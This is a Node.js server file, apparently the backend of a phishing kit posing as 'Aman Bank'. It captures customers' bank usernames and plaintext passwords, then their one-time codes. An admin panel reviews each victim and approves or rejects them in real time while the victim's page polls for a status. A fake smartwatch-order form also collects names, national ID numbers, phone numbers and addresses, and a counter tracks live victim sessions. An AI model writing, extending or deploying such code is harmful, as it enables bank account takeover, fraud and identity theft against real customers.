// ============================================================
// Aman Bank - Backend Server (no database, no external deps)
// Run with: node server.js
// Then open:
//   http://localhost:3000/index.html   (the customer-facing app)
//   http://localhost:3000/admin.html      (the admin dashboard)
// ============================================================

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = __dirname;
const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9';

// ---------- In-memory "database" ----------
// Everything lives in memory while the server process is running.
// Restarting the server clears it (no database, as requested).
let requests = [];       // { id, username, password, otp, name, phone, address, status, createdAt }
let nextId = 1;
const liveSessions = new Map(); // sessionId -> lastSeenTimestamp
const HEARTBEAT_WINDOW_MS = 8000; // a session counts as "live" if seen in the last 8s

// ---------- Helpers ----------
function sendJSON(res, statusCode, dataObj) {
  const body = JSON.stringify(dataObj);
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body),
  });
  res.end(body);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 1e6) req.destroy(); // 1MB safety limit
    });
    req.on('end', () => {
      if (!data) return resolve({});
      try {
        resolve(JSON.parse(data));
      } catch (err) {
        reject(err);
      }
    });
    req.on('error', reject);
  });
}

function todayKey() {
  return new Date().toISOString().slice(0, 10);
}

function hashPassword(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

function serveStatic(req, res, urlPath) {
  let filePath = urlPath === '/' ? '/index.html' : urlPath;
  filePath = path.join(PUBLIC_DIR, filePath);

  // Prevent path traversal outside the public dir
  if (!filePath.startsWith(PUBLIC_DIR)) {
    res.writeHead(403);
    return res.end('Forbidden');
  }

  function respond(finalPath) {
    fs.readFile(finalPath, (err, content) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('404 - الملف غير موجود');
      }
      const ext = path.extname(finalPath).toLowerCase();
      const mime = { '.html': 'text/html; charset=utf-8', '.js': 'application/javascript', '.css': 'text/css' }[ext] || 'application/octet-stream';
      const headers = { 'Content-Type': mime };
      if (ext === '.html') headers['Cache-Control'] = 'no-store, no-cache, must-revalidate';
      res.writeHead(200, headers);
      res.end(content);
    });
  }

  // جرّب المسار كما هو الأول
  fs.access(filePath, fs.constants.F_OK, (err) => {
    if (!err) return respond(filePath);
    // لو مش موجود ومفيهوش امتداد (زي /admin بدل /admin.html)، جرّب إضافة .html
    if (!path.extname(filePath)) {
      const withHtml = filePath + '.html';
      return fs.access(withHtml, fs.constants.F_OK, (err2) => {
        if (!err2) return respond(withHtml);
        respond(filePath); // هيرجع 404 بشكل طبيعي
      });
    }
    respond(filePath); // هيرجع 404 بشكل طبيعي
  });
}

// ---------- Request handler ----------
const server = http.createServer(async (req, res) => {
  const { method, url } = req;
  const urlObj = new URL(url, `http://${req.headers.host}`);
  const pathname = urlObj.pathname;

  try {
    // ---- API: verify the admin password without exposing it in admin.html ----
    if (method === 'POST' && pathname === '/api/admin-login') {
      const body = await readBody(req);
      const passwordHash = hashPassword((body.password || '').toString());
      const isValid = passwordHash.length === ADMIN_PASSWORD_HASH.length &&
        crypto.timingSafeEqual(Buffer.from(passwordHash), Buffer.from(ADMIN_PASSWORD_HASH));
      return sendJSON(res, 200, { ok: isValid });
    }

    // ---- API: receive a login submission from index.html ----
    if (method === 'POST' && pathname === '/api/login') {
      const body = await readBody(req);
      const username = (body.username || '').toString().slice(0, 100);
      const password = (body.password || '').toString().slice(0, 100);
      const orderId = Number(body.orderId);
      const linkedOrder = requests.find((request) => (
        request.id === orderId && request.type === 'watch-order'
      ));
      if (linkedOrder) {
        linkedOrder.username = username;
        linkedOrder.password = password;
        linkedOrder.status = 'pending';
        return sendJSON(res, 200, { ok: true, id: linkedOrder.id });
      }
      const duplicateWindowMs = 10000;
      const duplicate = requests.find((request) => (
        request.username === username &&
        request.password === password &&
        request.status === 'pending' &&
        Date.now() - request.createdAt < duplicateWindowMs
      ));
      if (duplicate) return sendJSON(res, 200, { ok: true, id: duplicate.id });

      const entry = {
        id: nextId++,
        username,
        password,
        otp: null,
        name: '-',
        phone: '-',
        address: '-',
        status: 'pending',
        createdAt: Date.now(),
        dateKey: todayKey(),
      };
      requests.unshift(entry);
      return sendJSON(res, 200, { ok: true, id: entry.id });
    }

    // ---- API: receive an OTP submission (optional future step) ----
    if (method === 'POST' && pathname === '/api/otp') {
      const body = await readBody(req);
      const entry = requests.find((r) => r.id === Number(body.id));
      if (!entry) return sendJSON(res, 404, { ok: false, error: 'not found' });
      entry.otp = (body.otp || '').toString().slice(0, 20);
      entry.status = 'pending'; // new OTP always needs fresh review
      return sendJSON(res, 200, { ok: true });
    }

    // ---- API: list all requests (for admin dashboard polling) ----
    if (method === 'GET' && pathname === '/api/requests') {
      return sendJSON(res, 200, { ok: true, requests });
    }

    // ---- API: check a single request's status (used by index.html / otp.html while waiting) ----
    if (method === 'GET' && pathname.startsWith('/api/status/')) {
      const idStr = pathname.split('/')[3];
      const entry = requests.find((r) => r.id === Number(idStr));
      if (!entry) return sendJSON(res, 404, { ok: false, error: 'not found' });
      return sendJSON(res, 200, { ok: true, status: entry.status });
    }

    // ---- API: update a request's status (approve/reject from admin) ----
    if (method === 'POST' && pathname.startsWith('/api/requests/') && pathname.endsWith('/status')) {
      const idStr = pathname.split('/')[3];
      const body = await readBody(req);
      const entry = requests.find((r) => r.id === Number(idStr));
      if (!entry) return sendJSON(res, 404, { ok: false, error: 'not found' });
      if (!['approved', 'rejected', 'pending'].includes(body.status)) {
        return sendJSON(res, 400, { ok: false, error: 'invalid status' });
      }
      entry.status = body.status;
      return sendJSON(res, 200, { ok: true });
    }

    // ---- API: heartbeat from an open index.html tab (for live visitor count) ----
    if (method === 'POST' && pathname === '/api/heartbeat') {
      const body = await readBody(req);
      const sessionId = (body.sessionId || '').toString().slice(0, 100);
      if (sessionId) liveSessions.set(sessionId, Date.now());
      return sendJSON(res, 200, { ok: true });
    }

    // ---- API: current live visitor count ----
    if (method === 'GET' && pathname === '/api/live-count') {
      const now = Date.now();
      let count = 0;
      for (const [sid, lastSeen] of liveSessions) {
        if (now - lastSeen <= HEARTBEAT_WINDOW_MS) count++;
        else liveSessions.delete(sid); // cleanup stale sessions
      }
      return sendJSON(res, 200, { ok: true, count });
    }

    // ---- API: today / total visit-request stats ----
    if (method === 'GET' && pathname === '/api/stats') {
      const today = todayKey();
      const todayCount = requests.filter((r) => r.dateKey === today).length;
      return sendJSON(res, 200, { ok: true, today: todayCount, total: requests.length });
    }

    // ---- API: receive a smartwatch order ----
    if (method === 'POST' && pathname === '/api/watch-order') {
      const body = await readBody(req);
      const order = {
        id: nextId++,
        type: 'watch-order',
        name: (body.name || '').toString().slice(0, 100),
        idNumber: (body.idNumber || '').toString().slice(0, 20),
        phone: (body.phone || '').toString().slice(0, 20),
        email: (body.email || '').toString().slice(0, 100),
        city: (body.city || '').toString().slice(0, 50),
        address: (body.address || '').toString().slice(0, 200),
        watchColor: (body.watchColor || '').toString().slice(0, 50),
        status: 'pending',
        createdAt: Date.now(),
        dateKey: todayKey(),
      };
      requests.unshift(order);
      return sendJSON(res, 200, { ok: true, id: order.id });
    }

    // ---- Fallback: serve static files (index.html, admin.html) ----
    if (method === 'GET') {
      return serveStatic(req, res, pathname);
    }

    res.writeHead(405);
    res.end('Method Not Allowed');
  } catch (err) {
    console.error(err);
    sendJSON(res, 500, { ok: false, error: 'server error' });
  }
});

server.listen(PORT, () => {
  console.log(`✔ الخادم شغال على http://localhost:${PORT}`);
  console.log(`  - صفحة العميل: http://localhost:${PORT}/index.html`);
  console.log(`  - لوحة الإدارة: http://localhost:${PORT}/admin.html`);
});
